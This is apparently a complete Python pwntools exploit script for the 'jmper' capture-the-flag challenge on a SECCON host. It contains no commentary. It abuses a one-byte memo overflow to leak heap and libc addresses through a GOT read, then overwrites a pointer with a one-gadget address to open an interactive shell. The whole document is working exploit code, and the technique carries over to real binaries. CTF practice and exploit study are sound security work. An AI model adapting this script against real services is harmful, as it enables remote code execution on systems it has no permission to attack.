from pwn import *

s= remote('jmper.pwn.seccon.jp',5656)
#s = remote('192.168.50.4',1234)
def add_user():
  s.recvuntil(':)')
  s.send('1\n')
def edit_name(value,string):
  s.recvuntil(':)')
  s.send('2\n')
  s.recvuntil('ID:')
  s.send(str(value)+'\n')
  s.recvuntil('name:')
  s.send(string)
def do_memo(value,string):
  s.recvuntil(':)')
  s.send('3\n')
  s.recvuntil('ID:')
  s.send(str(value)+'\n')
  s.recvuntil(':')
  s.send(string)
add_user()
do_memo(0,'A'*33)
s.recvuntil(':)')
s.send('5\n')
s.recvuntil('ID:')
s.send('0\n')
heap = u64(s.recvuntil('Add')[0x20:0x24]+'\x00'*4)-0x41
log.info("heap : 0x%08x"%heap)
do_memo(0,'A'*32+'\x08')
edit_name(0,p64(0x601FA0)+'\n')
s.recvuntil(':)')
s.send('4\n')
s.recvuntil('ID:')
s.send('0\n')
'''
puts 0x6fd60
malloc_hook 0x03BDEE0
magic 0x4647C
'''
puts = u64(s.recvuntil('1')[:-1]+'\x00\x00')
libc = puts - 0x6fd60
log.info("puts : 0x%08x"%puts)
log.info("libc : 0x%08x"%libc)
add_user()
do_memo(1,'A'*32+'\x08')
edit_name(1,p64(libc + 0x3BE038)+'\n')
raw_input()
edit_name(0,p64(libc + 0x4647C)+'\n')
s.interactive()
